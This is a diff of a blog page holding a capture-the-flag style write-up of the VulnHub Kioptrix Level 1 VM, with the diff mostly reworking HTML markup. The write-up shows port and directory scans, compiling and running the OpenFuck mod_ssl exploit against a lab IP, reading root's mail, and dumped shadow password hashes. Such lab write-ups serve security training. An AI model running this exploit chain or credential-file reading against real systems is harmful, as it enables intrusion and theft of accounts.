@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,13 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1 (#1)</h1>
-                  <p class="nested"><a href="/posts/20190927_vulnhub-hackme.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190928_vulnhub-kioptrix2.html"> » </a></p>
+                  <p><a href="/posts/20190927_vulnhub-hackme.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190928_vulnhub-kioptrix2.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix1/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
+<pre class="nested"><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
 Nmap scan report for 192.168.92.181
 Host is up, received arp-response (0.0011s latency).
 Scanned at 2019-09-27 15:42:01 PDT for 273s
@@ -152,7 +119,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. We explore the various directories and files found with <code>gobuster</code> scan but nothing interesting is found:  </p>
-<p class="nested"re><code>gobuster -u http://192.168.92.181:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
+<pre class="nested"><code>gobuster -u http://192.168.92.181:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
   http://192.168.92.181:80/index.html (Status: 200) [Size: 2890]
   http://192.168.92.181:80/manual (Status: 301)
   http://192.168.92.181:80/mrtg (Status: 301)
@@ -161,14 +128,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">3. We fallback on Nmap version detection for <code>443/tcp</code> and search exploits for <code>Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code> using <code>searchsploit</code>:  </p>
-<p class="nested"re><code>searchsploit mod_ssl
+<pre class="nested"><code>searchsploit mod_ssl
   Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)  | exploits/unix/remote/47080.c
 </code></pre>
 
 <p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot01.png" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>22/tcp    |  ssh          |  OpenSSH 2.9p2 (protocol 1.99)
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp    |  ssh          |  OpenSSH 2.9p2 (protocol 1.99)
 80/tcp    |  http         |  Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 111/tcp   |  rpcbind      |  2 (RPC #100000)
 137/udp   |  netbios-ns   |  Samba nmbd netbios-ns (workgroup: MYGROUP)
@@ -179,7 +146,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We compile this exploit and check it's usage options. It requries a platform specific offset and provides mapping of supported offsets. We determine the required offset value for our target to be <code>0x6b</code> based on the Nmap version detection results for <code>443/tcp</code>. Once executed, the exploit successfully establishes an elevated, remote session with the target:  </p>
-<p class="nested"re><code>gcc -o 47080 47080.c -lcrypto
+<pre class="nested"><code>gcc -o 47080 47080.c -lcrypto
 ./47080
   0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
 ./47080 0x6b 192.168.92.181 443
@@ -189,12 +156,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix1/screenshot03.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix1/screenshot04.png" />  </p>
 <p class="nested">2. We can now read the <code>/var/mail/root</code> file to complete the challenge:  </p>
-<p class="nested"re><code>cat /var/mail/root
+<pre class="nested"><code>cat /var/mail/root
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot05.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>root@kioptrix.level1&gt; id
+<pre class="nested"><code>root@kioptrix.level1&gt; id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 root@kioptrix.level1&gt;  
 root@kioptrix.level1&gt; uname
@@ -216,7 +183,7 @@ root
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<p class="nested"re><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
+<pre class="nested"><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:............
 harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:............
 </code></pre>
@@ -227,19 +194,17 @@ harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:............
 <li><a href="https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2">https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2</a>  </li>
 <li><a href="https://n0tty.github.io/2017/02/25/kioptrix-1/">https://n0tty.github.io/2017/02/25/kioptrix-1/</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20190927_vulnhub-hackme.html">[VulnHub] hackme: 1...</a> « | » <a href="/posts/20190928_vulnhub-kioptrix2.html">[VulnHub] Kioptrix: Level 1.1 ...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190927_vulnhub-hackme.html">[VulnHub] hackme: 1...</a> « | » <a href="/posts/20190928_vulnhub-kioptrix2.html">[VulnHub] Kioptrix: Level 1.1 ...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -247,6 +212,10 @@ harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:............
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
